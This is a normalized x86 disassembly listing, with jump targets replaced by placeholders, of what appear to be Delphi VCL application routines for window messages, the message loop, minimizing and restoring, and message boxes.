call sub_459d8c
sub_45a7e0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push j_sub_403960#7
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x13a ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a844
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x8 ]
call sub_404154
mov eax [ ebp - 0x4 ]
push eax
lea eax [ esi + 0xc ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
sub_45a84c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call DefWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_45a888
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call BeginPaint
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_45afd8
push eax
push 0x0
push 0x0
push ebx
call DrawIcon
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call EndPaint
pop ebx
mov esp ebp
pop ebp
retn
sub_45a8d4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push j_sub_4036ac#3
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_45a788
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx ]
mov eax ebx
cmp eax 0x53
jg r-xdata
inc ebx
xor esi esi
cmp eax 0xb017
jg r-xdata
je r-xdata
inc esi
dec ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0xb020
jg r-xdata
je r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov edx [ ebp - 0x8 ]
mov dx [ edx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_45b9f4
jmp r-xdata
cmp eax 0x16
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov edx esi
call sub_413918
mov edi eax
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x4 ]
call [ edi ]
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub eax 0xb031
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
cmp eax 0xb000
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0x1d
jg r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
add eax 0xfffffff2
sub eax 0x2
jb r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
sub eax 0xb01a
je r-xdata
mov esi eax
mov eax esi
call sub_4423cc
test eax eax
je r-xdata
sub eax 0xb001
je r-xdata
je r-xdata
sub eax 0x37
je r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xb0 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xb0 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov eax [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_45c920
and eax 0x7f
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_45b510
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_45b4b4
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
sub eax 0x5
je r-xdata
mov eax esi
call sub_4423cc
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10a ] 0x0
je r-xdata
sub eax 0x15
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x112 ] 0x0
je r-xdata
sub eax 0x112
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45afd8
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x13
je r-xdata
mov eax [ rw-data ]
call sub_459d8c
push ebp
call sub_45a84c
pop ecx
jmp r-xdata
sub eax 0x1a
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x9c ] 0x1
jmp r-xdata
push ebp
call sub_45a84c
pop ecx
jmp [ eax * 4 + jump_table_45a978 ]
call GetFocus
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x30 ]
jne r-xdata
jmp r-xdata
mov eax esi
call sub_4423cc
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_45b38c
test al al
je r-xdata
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
sub eax 0xf020
je r-xdata
add eax 0xffffffe0
sub eax 0x7
jb r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax ] 0xde534454
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_446d24
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_45a7e0
push ebp
call sub_45a84c
pop ecx
jmp r-xdata
sub eax 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x27
push ebp
call sub_45a84c
pop ecx
jmp r-xdata
push 0x0
push 0x0
push 0xb01a
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
push ebp
call sub_45a84c
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
xor eax eax
call sub_419250
jmp r-xdata
xor eax eax
call sub_452704
test eax eax
je r-xdata
mov [ rw-data ] 0x0
call GetFocus
mov ebx eax
mov eax esi
call sub_4423cc
push eax
call SetFocus
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax esi
call sub_43cd98
push ebx
call SetFocus
mov [ rw-data ] 0x1
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45aff4
jmp r-xdata
sub eax 0x100
je r-xdata
mov esi [ ebp - 0x8 ]
mov esi [ esi + 0x8 ]
push esi
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
add ebx 0xbc00
push ebx
mov eax [ ebp - 0x8 ]
push esi
call SendMessageA
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x1e1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9e ] 0x0
je r-xdata
push ebp
call sub_45a84c
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
sbb eax eax
inc eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x9d ] al
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
jmp r-xdata
call sub_457f8c
jmp r-xdata
push ebp
call sub_45a84c
pop ecx
jmp r-xdata
push ebp
call sub_45a888
pop ecx
jmp r-xdata
push ebp
call sub_45a84c
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xac ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_45a6ec
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xac ]
test eax eax
je r-xdata
push eax
call SetFocus
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45b0a4
jmp r-xdata
jmp r-xdata
call sub_42bf68
call sub_42c048
test al al
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_45a6dc
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45a6ec
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45a6e4
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4525b4
mov edx [ ebp - 0x4 ]
mov [ edx + 0xac ] eax
push ebp
call sub_45a84c
pop ecx
jmp r-xdata
call sub_452668
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xac ] edx
push ebp
call sub_45a84c
pop ecx
jmp r-xdata
call sub_42bf68
call sub_42c0a4
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx 0x8000
mov eax r-xdata
call sub_40cd9c
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
call GetLastError
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
push eax
call GetProcAddress
mov esi eax
mov ebx esi
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
push edx
mov edx [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call ebx
jmp r-xdata
sub_45aff4
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_45a6dc
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x6
mov eax [ ebx + 0x30 ]
call sub_45a00c
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
mov eax [ ebx + 0x44 ]
call sub_4423cc
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push 0x40
push 0x0
mov esi [ ebx + 0x44 ]
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x44 ]
push eax
mov eax [ esi + 0x40 ]
push eax
mov eax [ ebx + 0x44 ]
call sub_4423cc
push eax
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
push 0x0
push 0xf020
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
cmp [ ebx + 0x11a ] 0x0
je r-xdata
sub_45b0a4
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x9
mov eax [ ebx + 0x30 ]
call sub_45a00c
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
mov eax [ ebx + 0x44 ]
call sub_4423cc
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
mov eax [ ebx + 0x44 ]
test eax eax
je r-xdata
adc eax 0x0
push 0x0
push 0xf120
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
mov eax ebx
call sub_45a6ec
mov eax [ rw-data ]
mov esi [ eax + 0x64 ]
test esi esi
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
push 0x40
push 0x0
push 0x0
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
mov eax esi
call sub_4423cc
push eax
call SetFocus
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
xor edx edx
call sub_455d18
mov eax [ ebx + 0x44 ]
call sub_458134
sub_45b1a4
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call GetLastActivePopup
mov esi eax
test esi esi
je r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
push esi
call IsWindowVisible
test eax eax
je r-xdata
push esi
call IsWindowEnabled
test eax eax
je r-xdata
push esi
call SetForegroundWindow
sub_45b1e0
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
je r-xdata
mov eax esi
mov edx [ ebx + 0x8c ]
call sub_403fb0
push 0x100
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
call GetWindowTextA
mov ecx eax
mov edx esp
mov eax esi
call sub_40404c
jmp r-xdata
add esp 0x100
pop esi
pop ebx
retn
sub_45b22c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0xb0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
push edi
push esi
call IsDialogMessageA
cmp eax 0x1
sbb eax eax
inc eax
sub_45b250
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x22f ] 0x2
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x6c ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x6c ]
cmp [ edx + 0x22f ] 0x1
jne r-xdata
push edi
mov eax [ esi + 0x254 ]
push eax
call TranslateMDISysAccel
cmp eax 0x1
sbb eax eax
inc eax
sub_45b2a0
push ebx
push esi
push edi
push ebp
mov esi edx
mov edi eax
xor ebx ebx
mov eax [ esi + 0x4 ]
cmp eax 0x100
jb r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp eax 0x108
ja r-xdata
call GetCapture
mov ebp eax
test ebp ebp
jne r-xdata
push 0xfffffffa
push ebp
call GetWindowLongA
cmp eax [ rw-data ]
jne r-xdata
mov ebp [ esi ]
mov eax [ edi + 0x44 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov eax ebp
call sub_438aac
test eax eax
jne r-xdata
cmp ebp [ eax + 0x254 ]
jne r-xdata
mov bl 0x1
test ebp ebp
jne r-xdata
test ebp ebp
jne r-xdata
call sub_4423cc
mov ebp eax
jmp r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov ebp [ esi ]
push ebp
call GetParent
mov ebp eax
mov bl 0x1
jmp r-xdata
sub_45b358
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebp eax
xor ebx ebx
mov esi [ ebp + 0x84 ]
test esi esi
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xdc ]
test al al
je r-xdata
mov eax ebp
call sub_45c2b8
sub_45b38c
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov ebx eax
mov [ esp ] 0x0
cmp [ ebx + 0x12a ] 0x0
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov ecx esp
mov edx ebp
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
mov al 0x1
mov edi [ ebx + 0x44 ]
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov eax edi
call sub_4423cc
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebp
mov eax [ ebx + 0x44 ]
mov si 0xffab
call sub_403420
test al al
jne r-xdata
sub_45b3f8
push ebx
push esi
push edi
push ecx
mov edi edx
mov esi eax
xor ebx ebx
push 0x1
push 0x0
push 0x0
push 0x0
push edi
call PeekMessageA
test eax eax
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov bl 0x1
cmp [ edi + 0x4 ] 0x12
je r-xdata
mov [ esi + 0x9c ] 0x1
mov [ esp ] 0x0
cmp [ esi + 0xda ] 0x0
je r-xdata
mov edx edi
mov eax esi
call sub_45b358
test al al
jne r-xdata
mov ecx esp
mov edx edi
mov eax [ esi + 0xdc ]
call [ esi + 0xd8 ]
cmp [ esp ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_45b250
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_45b2a0
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_45b22c
test al al
jne r-xdata
push edi
call TranslateMessage
push edi
call DispatchMessageA
jmp r-xdata
sub_45b490
push ebx
add esp 0xffffffe4
mov ebx eax
mov edx esp
mov eax ebx
call sub_45b3f8
test al al
jne r-xdata
add esp 0x1c
pop ebx
retn
mov edx esp
mov eax ebx
call sub_45bd60
sub_45b4b4
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
call sub_4138f8
mov eax 0x8
call sub_4026bc
mov edx [ ebp + 0x8 ]
mov [ eax ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov edx eax
mov eax [ ebx + 0xa8 ]
call sub_4137bc
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebx
pop ebp
retn 0x8
lea edx [ ebp + 0x8 ]
push edx
push 0x0
push 0xb020
push eax
call SendMessageA
jmp r-xdata
sub_45b510
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
inc edi
xor esi esi
lea edx [ ebp + 0x8 ]
push edx
push 0x1
push 0xb020
push eax
call SendMessageA
jmp r-xdata
inc esi
dec edi
jne r-xdata
mov edx [ ebp + 0xc ]
cmp edx [ eax + 0x4 ]
jne r-xdata
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_413918
mov edx [ eax ]
cmp edx [ ebp + 0x8 ]
jne r-xdata
mov edx 0x8
call sub_4026dc
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_413808
jmp r-xdata
sub_45b5a4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax ebx
call [ eax - 0xc ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
xor eax eax
push ebp
push j_sub_4036ac#2
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
or edx 0xffffffff
mov eax ebx
mov edi [ eax ]
call [ edi + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x44 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
mov edi ebx
mov eax edi
call sub_4423a8
mov [ esi + 0x44 ] edi
sub_45b624
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x1
xor edx edx
push ebp
push sub_45b702
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax sub_45252c
call sub_407a0c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b709
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x0
retn
mov edx [ rw-data ]
mov edx [ edx ]
sub edx 0x3
je r-xdata
mov dl 0x2
call sub_455d18
sub edx 0x4
jne r-xdata
xor eax eax
push ebp
push sub_45b6c9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_45b490
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x0
je r-xdata
mov [ eax + 0x22b ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov dl 0x1
call sub_454c20
mov eax [ ebp - 0x4 ]
call sub_45aff4
jmp r-xdata
sub_45b724
push ebx
push esi
mov esi edx
mov ebx eax
call GetCapture
test eax eax
je r-xdata
call sub_40274c
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
call sub_40276c
push eax
call sub_40274c
pop edx
call sub_40b328
call sub_40274c
mov edx [ rw-data ]
call sub_4033b0
test al al
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0xd2 ] 0x0
je r-xdata
call sub_40274c
mov edx eax
mov eax ebx
call sub_45b91c
pop esi
pop ebx
retn
call sub_40274c
mov ecx eax
mov edx esi
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
jmp r-xdata
sub_45b7b4
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
call GetActiveWindow
mov [ ebp - 0xc ] eax
push 0x2
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x14 ] eax
push 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
xor eax eax
call sub_4525b4
mov [ ebp - 0x10 ] eax
call sub_4524d0
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
call sub_45a758
test al al
je r-xdata
mov [ ebp - 0x44 ] 0x28
lea eax [ ebp - 0x44 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
lea eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call GetWindowRect
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x3c ]
sub ecx edx
sar ecx 0x1
jns r-xdata
xor ecx ecx
push ebp
push j_sub_403960#6
push [ fs : ecx ]
mov [ fs : ecx ] esp
push ebx
push edi
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call MessageBoxA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b910
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
or ebx 0x100000
add ecx edx
push ecx
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x40 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
mov eax [ ebp - 0x10 ]
call sub_452668
mov eax [ ebp - 0xc ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x1c ]
call sub_4524d8
retn
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x48 ]
mov edx [ ebp - 0x50 ]
sub ecx edx
sar ecx 0x1
jns r-xdata
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
add ecx edx
push ecx
mov edx [ ebp - 0x4c ]
mov eax [ ebp - 0x54 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
sub_45b91c
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x108 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45b9d7
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x4 ]
call sub_403ff4
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x10
lea edx [ ebp - 0x108 ]
mov eax ebx
call sub_45b1e0
mov eax [ ebp - 0x108 ]
call sub_40441c
push eax
mov eax [ ebp - 0x4 ]
call sub_40441c
mov edx eax
mov eax ebx
pop ecx
call sub_45b7b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b9de
lea eax [ ebp - 0x108 ]
call sub_403f5c
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
mov eax [ ebp - 0x4 ]
call sub_408314
mov edx eax
lea eax [ ebp - 0x104 ]
call sub_402d34
lea eax [ ebp - 0x104 ]
mov edx r-xdata
call sub_402b4c
jbe r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404224
sub_45b9f4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] dx
mov esi eax
xor ebx ebx
mov [ esp + 0x8 ] 0x1
mov eax [ rw-data ]
mov edi [ eax + 0x68 ]
test edi edi
je r-xdata
cmp [ esi + 0xf2 ] 0x0
je r-xdata
cmp [ edi + 0x2aa ] 0x0
je r-xdata
test edi edi
je r-xdata
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ esi + 0xf4 ]
call [ esi + 0xf0 ]
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ edi + 0x2ac ]
call [ edi + 0x2a8 ]
mov ebx eax
jmp r-xdata
cmp [ esp + 0x8 ] 0x0
je r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax ebx
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
